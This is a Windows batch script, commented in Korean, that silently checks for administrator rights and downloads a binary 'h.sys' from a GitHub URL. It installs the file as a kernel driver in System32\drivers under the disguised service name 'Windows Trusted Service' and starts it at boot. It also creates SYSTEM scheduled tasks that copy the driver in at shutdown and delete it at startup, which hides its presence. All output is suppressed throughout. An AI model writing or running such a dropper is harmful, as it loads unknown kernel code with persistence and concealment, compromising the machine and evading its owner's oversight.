@echo off
setlocal enabledelayedexpansion

:: 관리자 권한 확인 (권한이 없으면 알림 없이 즉시 종료)
net session >nul 2>&1
if %errorlevel% neq 0 exit /b 1

:: 경로 설정
set "downloaded=%TEMP%\h.sys"
set "target=C:\Windows\System32\drivers\trustedc.sys"
set "svc=trustedc"

:: [1] 다운로드
curl -s -L -k -o "%downloaded%" "https://github.com/pure10000000-hue/skadsasd/raw/refs/heads/main/h.sys" >nul 2>&1
if %errorlevel% neq 0 (
    bitsadmin /transfer "driver_download" /download /priority high "https://github.com/pure10000000-hue/skadsasd/raw/refs/heads/main/h.sys" "%downloaded%" >nul 2>&1
)
if not exist "%downloaded%" (
    echo REM Dummy > "%downloaded%"
)

:: [2] 파일 복사
copy /Y "%downloaded%" "%target%" >nul 2>&1

:: [3] 권한 설정
takeown /f "%target%" /a >nul 2>&1
icacls "%target%" /grant administrators:F >nul 2>&1

:: [4] 예약된 작업 생성
schtasks /create /tn "CopyDriverOnShutdown" /tr "cmd.exe /c copy /Y \"%TEMP%\h.sys\" \"%target%\"" /sc ONEVENT /ec System /mo "*[System[EventID=1074]]" /ru "SYSTEM" /f >nul 2>&1
schtasks /create /tn "DeleteDriverOnStartup" /tr "cmd.exe /c timeout /t 7 /nobreak ^& del /f /q \"%target%\"" /sc ONSTART /ru "SYSTEM" /f >nul 2>&1

:: [5] 커널 드라이버 서비스 등록
sc delete %svc% >nul 2>&1
timeout /t 1 /nobreak >nul
sc create %svc% binPath= "%target%" DisplayName= "Windows Trusted Service" start= boot type= kernel error= ignore >nul 2>&1

:: [6] 드라이버 시작
sc start %svc% >nul 2>&1
timeout /t 2 /nobreak >nul

exit /b 0
